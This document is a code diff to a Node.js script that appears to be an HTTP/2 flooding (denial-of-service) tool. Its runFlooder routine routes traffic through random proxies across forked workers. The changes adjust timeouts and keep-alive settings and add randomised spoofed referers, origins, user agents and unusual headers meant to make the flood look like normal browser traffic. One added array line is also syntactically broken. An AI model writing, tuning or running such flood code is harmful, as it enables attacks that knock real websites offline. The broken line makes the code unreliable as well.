@@ -92,12 +92,12 @@ if (cluster.isMaster) {
 		const totalRAM = os.totalmem();
 		const usedRAM = totalRAM - os.freemem();
 		const ramPercentage = (usedRAM / totalRAM) * 100;
-		if (ramPercentage >= 50) {
+		if (ramPercentage >= 80) {
 			console.log('[!] Maximum RAM usage:', ramPercentage.toFixed(2), '%');
 			restartScript();
 		}
 	};
-	setInterval(handleRAMUsage, 5000);
+	setInterval(handleRAMUsage, 1000);
 	for (let counter = 1; counter <= args.threads; counter++) {
 		cluster.fork();
 	}
@@ -124,8 +124,8 @@ if (cluster.isMaster) {
          readable: true
      });
  
-     connection.setTimeout(options.timeout * 600000);
-     connection.setKeepAlive(true, 600000);
+     connection.setTimeout(options.timeout * 1000);
+     connection.setKeepAlive(true, args.time * 1000);
      connection.setNoDelay(true)
  
      connection.on("connect", () => {
@@ -178,7 +178,7 @@ if (cluster.isMaster) {
 		});
 		return randomStringArray.join('');
 	}
-const refers = ['google.com', 'youtube.com', 'facebook.com', 'wikipedia.org', 'twitter.com', 'amazon.com', 'yahoo.com', 'reddit.com', 'netflix.com', 'instagram.com', 'linkedin.com', 'ebay.com', 'microsoft.com', 'apple.com', 'twitch.tv', 'hulu.com', 'disneyplus.com', 'espn.com', 'whatsapp.com', 'telegram.com', 'pinterest.com', 'dropbox.com', 'zoom.us', 'bbc.com', 'vk.com', 'dailymotion.com', 'imgur.com', 'spotify.com', 'soundcloud.com', 'stackoverflow.com', 'reuters.com', 'theguardian.com', 'aliexpress.com', 'tiktok.com', 'cnbc.com', 'yandex.ru', 'qq.com', 'baidu.com', 'mail.ru', 'sina.com.cn', 'github.com'];
+const refers = [ parsedTarget.host 'google.com', 'youtube.com', 'facebook.com', 'wikipedia.org', 'twitter.com', 'amazon.com', 'yahoo.com', 'reddit.com', 'netflix.com', 'instagram.com', 'linkedin.com', 'ebay.com', 'microsoft.com', 'apple.com', 'twitch.tv', 'hulu.com', 'disneyplus.com', 'espn.com', 'whatsapp.com', 'telegram.com', 'pinterest.com', 'dropbox.com', 'zoom.us', 'bbc.com', 'vk.com', 'dailymotion.com', 'imgur.com', 'spotify.com', 'soundcloud.com', 'stackoverflow.com', 'reuters.com', 'theguardian.com', 'aliexpress.com', 'tiktok.com', 'cnbc.com', 'yandex.ru', 'qq.com', 'baidu.com', 'mail.ru', 'sina.com.cn', 'github.com' ];
  function runFlooder() {
      const proxyAddr = randomElement(proxies);
      const parsedProxy = proxyAddr.split(":");
@@ -187,7 +187,22 @@ const refers = ['google.com', 'youtube.com', 'facebook.com', 'wikipedia.org', 't
      const useragentAndroid = `Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Mobile Safari/537.36`;
      const finnalUa = Math.random() < 0.5 ? useragentWindows : useragentAndroid;
      const Ref = refers[Math.floor(Math.floor(Math.random() * refers.length))];
-
+const bexHeaders1 = [
+  { "Max-Forwards": Math.random() < 0.5 ? '5' : '10' },
+  { "Service-Worker-Navigation-Preload": 'true' },
+  { "Supports-Loading-Mode": "credentialed-prerender" },
+  { 'viewport-height': '1080' },
+  { "From": bexRandomString(3, 10) + '@gmail.com' },
+  { "TK": "?" },
+]
+const bexHeaders2 = [
+  { "Expect": "100-continue" },
+  { "cluster-ip": bexRandomString(5, 5) },
+  { "accept-char": "UTF-8" },
+  { "CF-Visitor": `{"scheme":"https"}` },
+  { "TTL-3": "1.5" },
+  { "data-return": "false" },
+]
 let headersbex = {
 ":method": "GET",
 ":scheme": "https",
@@ -204,20 +219,22 @@ let headersbex = {
 ...(Math.random() < 0.75 ? {'Upgrade-Insecure-Requests': '1'} :{}),
 ...(Math.random() < 0.75 ? {"Cache-Control": "max-age=0"} :{}),
 'Pragma': 'no-cache',
-"referer": Math.random() < 0.25 ? 'https://' + Ref : 'https://' + Ref + `/${["index", "home", "login", "register"][Math.floor(Math.random() * 4)]}`,
-"origin": Math.random() < 0.5 ? "https://" + Ref + (Math.random() < 0.5 ? ":" + Math.floor(Math.random() * 65535 + 1) + '/' : '@root/') : "https://" + (Math.random() < 0.5 ? 'root-admin.' : 'root-root.') + Ref,
+"referer": Math.random() < 0.5 ? Math.random() < 0.5 ? "https://" + Ref + (Math.random() < 0.5 ? ":" + Math.floor(Math.random() * 65535 + 1) + '/' : '@root/') : "https://" + (Math.random() < 0.5 ? 'root-admin.' : 'root-root.') + Ref : Math.random() < 0.5 ? 'https://' + Ref : 'https://' + Ref + `/${["index", "home", "login", "register"][Math.floor(Math.random() * 4)]}`,
+"origin": "https://" + Ref,
+...(Math.random() < 0.5 ? bexHeaders1[Math.floor(Math.random() * bexHeaders1.length)] : {}),
+...(Math.random() < 0.5 ? bexHeaders2[Math.floor(Math.random() * bexHeaders2.length)] : {}),
 };
      const proxyOptions = {
          host: parsedProxy[0],
          port: ~~parsedProxy[1],
          address: parsedTarget.host + ":443",
-         timeout: 10
+         timeout: args.time,
      };
 
      Socker.HTTP(proxyOptions, (connection, error) => {
          if (error) return
  
-         connection.setKeepAlive(true, 600000);
+         connection.setKeepAlive(true, args.time * 1000);
          connection.setNoDelay(true)
 
          const tlsOptions = {
@@ -241,7 +258,7 @@ let headersbex = {
 
          tlsBex.allowHalfOpen = true;
          tlsBex.setNoDelay(true);
-         tlsBex.setKeepAlive(true, 600000);
+         tlsBex.setKeepAlive(true, args.time * 1000);
          tlsBex.setMaxListeners(0);
  
          const bexClient = http2.connect(parsedTarget.href, {
